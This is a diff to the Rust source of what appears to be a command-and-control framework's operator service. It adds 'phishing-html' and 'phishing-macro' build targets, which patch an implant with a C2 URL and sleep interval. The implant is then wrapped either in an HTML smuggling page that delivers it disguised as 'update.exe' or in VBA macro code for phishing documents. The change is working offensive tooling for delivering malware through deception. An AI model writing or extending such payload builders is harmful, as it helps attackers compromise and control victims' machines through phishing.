@@ -739,6 +739,30 @@ impl OperatorService for OperatorServiceImpl {
                 &[], // No special features
                 true // Obfuscate by default
             ).map_err(|e| Status::internal(format!("Compilation failed: {}", e)))?;
+        } else if req.platform == "phishing-html" {
+            // Generate payload then wrap in HTML
+            crate::builder::Builder::patch_implant(
+                &template_path,
+                &output_path,
+                &req.c2_url,
+                req.sleep_interval as u64,
+            ).map_err(|e| Status::internal(format!("Payload build failed: {}", e)))?;
+            
+            let payload = std::fs::read(&output_path).map_err(|e| Status::internal(e.to_string()))?;
+            let html = crate::builder::phishing::PhishingGenerator::generate_html_smuggling(&payload, "update.exe");
+            std::fs::write(&output_path, html).map_err(|e| Status::internal(e.to_string()))?;
+        } else if req.platform == "phishing-macro" {
+            // Generate payload then wrap in VBA
+            crate::builder::Builder::patch_implant(
+                &template_path,
+                &output_path,
+                &req.c2_url,
+                req.sleep_interval as u64,
+            ).map_err(|e| Status::internal(format!("Payload build failed: {}", e)))?;
+            
+            let payload = std::fs::read(&output_path).map_err(|e| Status::internal(e.to_string()))?;
+            let vba = crate::builder::phishing::PhishingGenerator::generate_macro_vba(&payload);
+            std::fs::write(&output_path, vba).map_err(|e| Status::internal(e.to_string()))?;
         } else {
             // Patch existing template
             crate::builder::Builder::patch_implant(
